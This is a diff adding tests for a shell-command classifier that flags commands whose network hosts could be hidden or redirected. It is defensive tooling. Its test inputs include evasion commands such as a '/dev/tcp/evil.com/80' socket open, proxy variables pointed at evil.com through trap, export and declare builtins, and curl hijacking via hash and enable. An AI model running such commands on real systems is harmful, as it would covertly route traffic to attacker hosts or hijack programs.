@@ -173,3 +173,103 @@ describe('hosts in whole lines', () => {
     expect(new Set(keys).size).toBe(keys.length);
   });
 });
+
+describe('fix round 4: bash lexing and shell-state allowlist (rulings R-f, R-g)', () => {
+  const allNet = (cmd: string) =>
+    classifyCommand(cmd, ctx)
+      .findings.filter((f) => f.action === 'network')
+      .map((f) => f.hosts);
+  const hidden = (cmd: string) => {
+    const nets = allNet(cmd);
+    expect(nets.length, cmd).toBeGreaterThan(0);
+    for (const h of nets) expect(h, cmd).toBeUndefined();
+  };
+  it('a { or } inside a command is an argument, not a group delimiter (R-f)', () => {
+    for (const cmd of [
+      'curl https://ok.com } evil.com',
+      'curl https://ok.com { evil.com',
+      'curl https://ok.com } https://evil.com',
+      'curl https://ok.com } -x evil.com:80',
+      'curl https://ok.com { --proxy evil.com:80',
+      'wget https://ok.com } -e https_proxy=evil.com:80',
+    ]) {
+      hidden(cmd);
+    }
+  });
+  it('a carriage return does not split words (R-f)', () => {
+    for (const cmd of [
+      'curl -H\r evil.com https://ok.com',
+      'curl -H\r -xevil.com:80 https://ok.com',
+      'curl -o\r -xevil.com:80 https://ok.com',
+      'curl https://ok.com\r evil.com',
+    ]) {
+      hidden(cmd);
+    }
+  });
+  it('a builtin outside the safe set anywhere in the line hides every host (R-g)', () => {
+    for (const cmd of [
+      "trap 'export https_proxy=http://evil.com:9' DEBUG; curl https://ok.com",
+      'builtin export https_proxy=http://evil.com:9; curl https://ok.com',
+      'command export https_proxy=http://evil.com:9; curl https://ok.com',
+      'command export ALL_PROXY=evil.com:9; curl https://ok.com',
+      'command declare -x https_proxy=http://evil.com:9; curl https://ok.com',
+      'command declare -x https_proxy=evil.com:9; gh pr view 1',
+      'builtin source ./x; curl https://ok.com',
+      'command . ./x; curl https://ok.com',
+      'hash -p ./evil curl; curl https://ok.com',
+      'enable -f ./x.so curl; curl https://ok.com',
+      'set -a; curl https://ok.com',
+      'exec 3<>/dev/tcp/evil.com/80; curl https://ok.com',
+      'let x=1; curl https://ok.com',
+      'time true; curl https://ok.com',
+      'if true; then curl https://ok.com; fi',
+      'printf -vhttp_proxy x; curl https://ok.com',
+      'printf -v http_proxy x; curl https://ok.com',
+    ]) {
+      hidden(cmd);
+    }
+  });
+  it('any assignment form before a program hides every host (R-g)', () => {
+    for (const cmd of [
+      'https_proxy+=http://evil.com:9; curl https://ok.com',
+      'a[0]=x; curl https://ok.com',
+      'X=1 Y+=2 ls; curl https://ok.com',
+    ]) {
+      hidden(cmd);
+    }
+  });
+  it('a program word the shell could expand into a builtin hides every host', () => {
+    for (const cmd of [
+      '${a:-export} https_proxy=http://evil.com:9; curl https://ok.com',
+      'expor? https_proxy=http://evil.com:9; curl https://ok.com',
+      '{export,https_proxy=http://evil.com:9}; curl https://ok.com',
+    ]) {
+      hidden(cmd);
+    }
+  });
+  it('a default-assigning expansion anywhere hides every host', () => {
+    for (const cmd of [
+      'echo ${https_proxy:=http://evil.com:9}; curl https://ok.com',
+      ': ${https_proxy=http://evil.com:9}; curl https://ok.com',
+      'ls > ${https_proxy:=x}; curl https://ok.com',
+    ]) {
+      hidden(cmd);
+    }
+  });
+  it('the safe builtins and external programs keep hosts visible', () => {
+    for (const cmd of [
+      'cd /w/sub && curl https://ok.com',
+      'echo hi; curl https://ok.com',
+      'true && curl https://ok.com',
+      'test -f x && curl https://ok.com',
+      '[ -f x ] && curl https://ok.com',
+      'pwd; curl https://ok.com',
+      ': ; curl https://ok.com',
+      'printf %s x; curl https://ok.com',
+      'ls -la; curl https://ok.com',
+      '{ curl https://ok.com; }',
+    ]) {
+      expect(allNet(cmd), cmd).toEqual([['ok.com']]);
+    }
+  });
+});
